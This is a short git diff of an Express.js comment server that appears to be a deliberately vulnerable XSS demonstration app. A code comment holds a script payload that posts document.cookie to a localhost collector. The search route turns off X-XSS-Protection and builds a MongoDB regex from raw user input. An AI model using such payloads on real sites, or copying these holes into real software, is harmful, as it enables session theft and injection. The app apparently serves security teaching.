@@ -11,7 +11,7 @@ var express = require ('express'),
   app = express (),
   counter = 1;
 
-  //<script>$.ajax({type: 'POST', data: JSON.stringify({userInfo: document.cookie}), contentType: 'application/json', url: 'http://localhost:8085/'});</script>
+  //<script>$.ajax({type: 'POST', data: JSON.stringify({userInfo: document.cookie}), contentType: 'application/json', url: 'http://localhost:8085/stored'});</script>
 
 //------------------CORS-----------------------------------------------------------/
   app.use(function(req, res, next) {
@@ -34,7 +34,10 @@ app
 
 app
   .get ('/', function (req, res) {
-    if (!req.cookies.counter) { res.cookie ('counter', counter++); }
+    if (req.cookies) {
+      for (var key in req.cookies) { key !== 'counter' ? res.clearCookie (key, {path: '/'}) : null; }
+    }
+    if (!req.cookies.counter) { res.cookie ('counter', counter++); console.log (counter); }
 
     commentModel.find ({}, {comment: 1}, function (err, comments) {
       if (err) {return (res.sendStatus (500));}
@@ -61,7 +64,7 @@ app
   .get ('/search', function (req, res) {
     res.header('X-XSS-Protection', '0');
     var key = req.query.key;
-    console.log (key);
+    //console.log (key);
 
     commentModel.findOne ({comment: {$regex: ".*" + key + ".*"}}, {comment: 1}, function (err, response) {
       if (err) {return (res.sendStatus (500));}
